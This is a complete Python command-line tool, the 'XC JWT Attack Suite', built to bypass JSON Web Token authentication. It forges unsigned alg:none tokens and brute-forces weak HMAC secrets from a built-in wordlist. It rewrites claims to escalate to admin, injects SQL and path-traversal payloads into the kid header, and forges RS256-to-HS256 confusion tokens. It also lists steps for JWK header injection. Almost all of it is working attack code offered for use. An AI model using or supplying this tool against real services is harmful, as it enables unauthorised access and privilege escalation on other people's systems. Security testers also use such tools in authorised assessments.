#!/usr/bin/env python3
"""XC JWT — JWT Attack Suite"""

import sys, ssl, re, json, base64, hmac, hashlib, time, argparse, struct
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from urllib.parse import urlparse

R='\033[91m'; G='\033[92m'; Y='\033[93m'; B='\033[94m'; M='\033[95m'; C='\033[96m'; W='\033[97m'; DIM='\033[2m'; BOLD='\033[1m'; RST='\033[0m'

BANNER = f"""{Y}
     ██╗██╗    ██╗████████╗
     ██║██║    ██║╚══██╔══╝
     ██║██║ █╗ ██║   ██║
██   ██║██║███╗██║   ██║
╚█████╔╝╚███╔███╔╝   ██║
 ╚════╝  ╚══╝╚══╝    ╚═╝  {R}→ Auth Bypass{RST}
{DIM}JWT Attack Suite — XC Hub{RST}
"""

COMMON_SECRETS = [
    'secret', 'password', '123456', 'admin', 'key', 'test',
    'qwerty', 'letmein', 'changeme', 'supersecret', 'mysecret',
    'secretkey', 'private', 'jwt_secret', 'jwtsecret', 'jwtkey',
    'token', 'apikey', 'api_key', 'app_secret', 'your-256-bit-secret',
    'your-secret-key', 'your_jwt_secret', 'HS256', 'RS256',
    '', 'null', 'none', 'undefined',
    'secret123', 'password123', 'admin123', '1234567890',
    'abcdefghijklmnopqrstuvwxyz', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
    '0000000000000000', 'aaaaaaaaaaaaaaaa',
    'flask', 'django', 'rails', 'laravel', 'spring',
    'SjvArm8MDpwFP2wd', 'V3ryS3cretK3y!', 'ThisIsMySecretKey',
]

def b64url_decode(s):
    s = s.replace('-', '+').replace('_', '/')
    pad = 4 - len(s) % 4
    if pad != 4:
        s += '=' * pad
    return base64.b64decode(s)

def b64url_encode(b):
    return base64.b64encode(b).replace(b'+', b'-').replace(b'/', b'_').rstrip(b'=').decode()

def decode_jwt(token):
    parts = token.strip().split('.')
    if len(parts) != 3:
        return None, None, None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception as e:
        print(f"{R}JWT decode error: {e}{RST}")
        return None, None, None

def encode_jwt(header, payload, secret=b'', algorithm='HS256'):
    h = b64url_encode(json.dumps(header, separators=(',',':')).encode())
    p = b64url_encode(json.dumps(payload, separators=(',',':')).encode())
    signing_input = f"{h}.{p}"
    if algorithm == 'none' or not secret:
        sig = ''
    elif algorithm.startswith('HS'):
        bits = int(algorithm[2:])
        hash_func = {256: hashlib.sha256, 384: hashlib.sha384, 512: hashlib.sha512}.get(bits, hashlib.sha256)
        sig = b64url_encode(hmac.new(secret if isinstance(secret, bytes) else secret.encode(), signing_input.encode(), hash_func).digest())
    else:
        sig = ''
    return f"{signing_input}.{sig}"

def attack_none_alg(token):
    print(f"\n{BOLD}{B}━━━ ATTACK: alg:none ━━━{RST}")
    header, payload, _ = decode_jwt(token)
    if not header or not payload:
        return []
    results = []
    for alg_val in ['none', 'None', 'NONE', 'nOnE']:
        h = {**header, 'alg': alg_val}
        forged = encode_jwt(h, payload, b'', 'none')
        print(f"  {Y}[alg={alg_val}]{RST}")
        print(f"  {W}{forged}{RST}")
        forged_trailing = forged + '.'
        print(f"  {DIM}(with trailing dot){RST}")
        print(f"  {W}{forged_trailing}{RST}\n")
        results.append({'type': 'alg:none', 'alg': alg_val, 'token': forged})
    return results

def attack_weak_secret(token, wordlist=None):
    print(f"\n{BOLD}{B}━━━ ATTACK: Weak Secret Brute Force ━━━{RST}")
    header, payload, orig_sig = decode_jwt(token)
    if not header or not payload:
        return None
    alg = header.get('alg', 'HS256')
    if not alg.startswith('HS'):
        print(f"  {Y}Algorithm is {alg} — brute force only works on HS256/384/512{RST}")
        return None

    secrets = wordlist or COMMON_SECRETS
    bits = int(alg[2:])
    hash_func = {256: hashlib.sha256, 384: hashlib.sha384, 512: hashlib.sha512}.get(bits, hashlib.sha256)

    parts = token.strip().split('.')
    signing_input = f"{parts[0]}.{parts[1]}".encode()

    print(f"  Testing {len(secrets)} secrets against {alg}...")
    for secret in secrets:
        try:
            sig = b64url_encode(hmac.new(secret.encode(), signing_input, hash_func).digest())
            if sig == orig_sig:
                print(f"  {R}[CRACKED!]{RST} Secret = {W}'{secret}'{RST}")
                forged = forge_with_secret(token, secret, admin_escalate=True)
                print(f"\n  {Y}Admin-escalated token:{RST}")
                print(f"  {W}{forged}{RST}")
                return secret
        except: pass
    print(f"  {G}No weak secret found in wordlist ({len(secrets)} tried){RST}")
    return None

def forge_with_secret(token, secret, admin_escalate=False):
    header, payload, _ = decode_jwt(token)
    if admin_escalate:
        mods = {
            'role': 'admin', 'is_admin': True, 'admin': True,
            'isAdmin': True, 'user_type': 'admin',
            'permissions': ['admin', 'superuser'],
        }
        for k, v in mods.items():
            if k in payload:
                print(f"  {Y}Escalating {k}: {payload[k]} → {v}{RST}")
                payload[k] = v
        if 'sub' in payload and isinstance(payload['sub'], (int, str)):
            print(f"  {Y}Trying sub=1 (user ID 1 = often admin){RST}")
            payload['sub'] = 1
    return encode_jwt(header, payload, secret.encode())

def attack_kid_injection(token):
    print(f"\n{BOLD}{B}━━━ ATTACK: kid Injection ━━━{RST}")
    header, payload, _ = decode_jwt(token)
    if not header or not payload:
        return []
    if 'kid' not in header:
        print(f"  {DIM}No 'kid' field in header — not applicable{RST}")
        return []

    print(f"  Original kid: {C}{header['kid']}{RST}")
    results = []
    kid_payloads = [
        ('SQLi — always true',    "' UNION SELECT 'xckey' -- -"),
        ('SQLi — comment',        "1' OR '1'='1"),
        ('Path traversal',        '../../../dev/null'),
        ('Path traversal + null', '../../../../../../dev/null\x00'),
        ('Known empty file',      '/dev/null'),
        ('Null string',           'null'),
        ('Empty string',          ''),
    ]
    for label, kid_val in kid_payloads:
        h = {**header, 'kid': kid_val}
        forged = encode_jwt(h, payload, b'xckey')
        print(f"\n  {Y}[{label}]{RST}")
        print(f"  kid={C}{kid_val}{RST}")
        print(f"  {W}{forged[:80]}...{RST}")
        results.append({'type': 'kid_injection', 'kid': kid_val, 'token': forged})
    return results

def attack_jwk_injection(token):
    print(f"\n{BOLD}{B}━━━ ATTACK: JWK Header Injection ━━━{RST}")
    header, payload, _ = decode_jwt(token)
    if not header:
        return
    print(f"""  Concept: embed attacker-controlled JWK in header's 'jwk' field.
  Server verifies using the embedded key instead of trusted keystore.

  Steps:
  1. Generate RSA keypair (openssl genrsa -out priv.pem 2048)
  2. Extract public key components (n, e)
  3. Build JWK: {{"kty":"RSA","n":"<n>","e":"AQAB"}}
  4. Set header: alg=RS256, jwk={{...your public key...}}
  5. Sign with your PRIVATE key
  6. Server uses embedded PUBLIC key to verify → accepts your forged token

  Tool: jwt_tool.py -X i (for full automation with RSA keys)
  Or: python-jose, authlib to craft properly""")

def attack_rs_to_hs(token, pubkey_pem=None):
    print(f"\n{BOLD}{B}━━━ ATTACK: RS256 → HS256 Confusion ━━━{RST}")
    header, payload, _ = decode_jwt(token)
    if not header:
        return
    alg = header.get('alg', '')
    if not alg.startswith('RS'):
        print(f"  {DIM}Token uses {alg}, not RS — not applicable{RST}")
        return
    print(f"""  Algorithm: {R}{alg}{RST} → target: {Y}HS256{RST}

  Concept: Server uses RSA public key for RS256 verification.
  If you change alg to HS256, the server uses the PUBLIC KEY as HMAC secret.
  Since the public key is... public, you can sign with it.

  Steps:
  1. Grab server's public key from: /jwks.json, /.well-known/jwks.json, /api/keys
  2. Download PEM: openssl s_client -connect target.com:443 | openssl x509 -pubkey
  3. Sign with pubkey as HMAC secret:
     python3 jwt.py <token> --rs2hs --pubkey server_pubkey.pem
  4. Change alg to HS256 in header

  Automatic (if you have pubkey.pem):
  python3 -c "
  import jwt, json
  pub = open('pubkey.pem','rb').read()
  h,p,_ = decode_jwt(token)
  h['alg'] = 'HS256'
  print(jwt.encode(p, pub, algorithm='HS256', headers=h))
  "
""")
    if pubkey_pem:
        try:
            with open(pubkey_pem, 'rb') as f:
                pubkey = f.read()
            h = {**header, 'alg': 'HS256'}
            h.pop('kid', None)
            forged = encode_jwt(h, payload, pubkey)
            print(f"  {R}[Forged HS256 token using pubkey]{RST}")
            print(f"  {W}{forged}{RST}")
        except Exception as e:
            print(f"  {R}Failed: {e}{RST}")

def decode_and_display(token):
    print(f"\n{BOLD}{B}━━━ JWT DECODE ━━━{RST}")
    header, payload, sig = decode_jwt(token)
    if not header:
        return
    print(f"\n  {BOLD}Header:{RST}")
    for k, v in header.items():
        print(f"    {C}{k}{RST}: {W}{v}{RST}")
    print(f"\n  {BOLD}Payload:{RST}")
    for k, v in payload.items():
        color = R if k in ('role','admin','is_admin','isAdmin','sub','user_id','exp') else W
        print(f"    {C}{k}{RST}: {color}{v}{RST}")
    if 'exp' in payload:
        import datetime
        exp_dt = datetime.datetime.utcfromtimestamp(payload['exp'])
        now = datetime.datetime.utcnow()
        if exp_dt < now:
            print(f"\n  {Y}Token EXPIRED at {exp_dt} UTC{RST}")
        else:
            print(f"\n  {G}Token valid until {exp_dt} UTC{RST}")
    print(f"\n  {BOLD}Signature:{RST} {DIM}{sig[:40]}...{RST}")

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description='XC JWT Attack Suite')
    parser.add_argument('token', help='JWT token to attack')
    parser.add_argument('--decode', action='store_true', help='Decode and display JWT')
    parser.add_argument('--none', action='store_true', help='alg:none attack')
    parser.add_argument('--brute', action='store_true', help='Brute force weak secret')
    parser.add_argument('--wordlist', help='Custom wordlist file for brute force')
    parser.add_argument('--kid', action='store_true', help='kid injection attack')
    parser.add_argument('--jwk', action='store_true', help='JWK header injection info')
    parser.add_argument('--rs2hs', action='store_true', help='RS256→HS256 confusion')
    parser.add_argument('--pubkey', help='Public key PEM for RS256→HS256')
    parser.add_argument('--forge', help='Secret to forge token with (+ admin escalation)')
    parser.add_argument('--full', action='store_true', help='Run all attacks')
    args = parser.parse_args()

    token = args.token.strip()
    print(f"{BOLD}Token:{RST} {DIM}{token[:60]}...{RST}\n")

    if args.decode or args.full:
        decode_and_display(token)

    if not (args.decode and not args.full):
        decode_and_display(token)

    wordlist = None
    if args.wordlist:
        try:
            with open(args.wordlist) as f:
                wordlist = [l.strip() for l in f if l.strip()]
            print(f"{G}Wordlist loaded: {len(wordlist)} secrets{RST}")
        except Exception as e:
            print(f"{R}Wordlist error: {e}{RST}")

    if args.none or args.full:
        attack_none_alg(token)

    if args.brute or args.full:
        attack_weak_secret(token, wordlist)

    if args.kid or args.full:
        attack_kid_injection(token)

    if args.jwk or args.full:
        attack_jwk_injection(token)

    if args.rs2hs or args.full:
        attack_rs_to_hs(token, args.pubkey)

    if args.forge:
        print(f"\n{BOLD}{B}━━━ FORGE WITH SECRET ━━━{RST}")
        forged = forge_with_secret(token, args.forge, admin_escalate=True)
        print(f"  {R}[Forged]{RST} {W}{forged}{RST}")

    if not any([args.decode, args.none, args.brute, args.kid, args.jwk, args.rs2hs, args.forge, args.full]):
        print(f"\n{DIM}Options: --decode --none --brute --kid --jwk --rs2hs --forge SECRET --full{RST}")
        print(f"{DIM}Example: python3 jwt.py <token> --full{RST}")
        print(f"{DIM}         python3 jwt.py <token> --brute --wordlist secrets.txt{RST}\n")

if __name__ == '__main__':
    main()
